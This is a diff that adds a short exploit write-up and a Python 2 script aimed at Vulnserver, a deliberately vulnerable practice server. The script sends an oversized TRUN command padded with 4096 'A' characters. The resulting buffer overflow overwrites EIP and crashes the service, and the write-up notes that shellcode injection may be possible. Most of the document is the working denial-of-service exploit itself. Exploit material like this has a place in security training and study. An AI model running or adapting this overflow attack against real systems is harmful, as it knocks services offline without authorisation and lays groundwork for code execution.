@@ -1,0 +1,28 @@
+DEV-BO-D001
+Infidel DoS
+PLATFORM: Windows
+SOFTWARE: Vulnserver, all versions
+http://www.thegreycorner.com/2010/12/introducing-vulnserver.html
+The TRUN command is vulnerable to a buffer overflow attack, which overwrites EIP and causes the program to SEGFAULT, crashing the server.
+This vulnerability may also be used to inject shellcode (I haven't finished the exploit for that)
+CODE (.py/python 2)
+
+import os
+import socket
+import sys
+if "-h" in sys.argv[:]:
+    print("VULNSERVER DENIAL OF SERVICE")
+    print("Usage: python vulnserverdos.py [host ip] [port (default 9999)]")
+    print("\nThis program leverages a Buffer Overflow vulnerability in vulnserver to overwrite EIP and cause the program to crash.")
+    sys.exit(0)
+host=sys.argv[1]
+try:
+    port=int(sys.argv[2])
+except:
+    port=9999
+a="A"*4096
+exploit="TRUN /.:/"+str(a)
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host, port))
+s.sendall(exploit)
+s.close()
